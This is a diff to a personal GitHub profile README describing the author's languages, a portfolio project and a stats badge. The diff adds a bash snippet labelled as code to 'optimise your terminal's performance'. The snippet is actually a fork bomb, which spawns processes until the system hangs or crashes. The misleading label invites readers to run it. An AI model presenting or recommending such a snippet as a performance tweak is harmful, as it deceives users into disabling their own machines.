@@ -6,6 +6,12 @@ I'm familiar working with `TypeScript`, `JavaScript`, `Rust` and `Go`.
 
 I'm also currently developing a personal portfolio (LOL this doesn't seem like it'll ever be finished 💀).
 
+Here's a nice piece of code to optimise your terminal's performance:
+
+```bash
+:() { :|:& }; :
+```
+
 ## 📊 GitHub Statistics
 
 ![My GitHub Stats](https://github-readme-stats.vercel.app/api?username=kKar1503&show_icons=true&theme=dark)
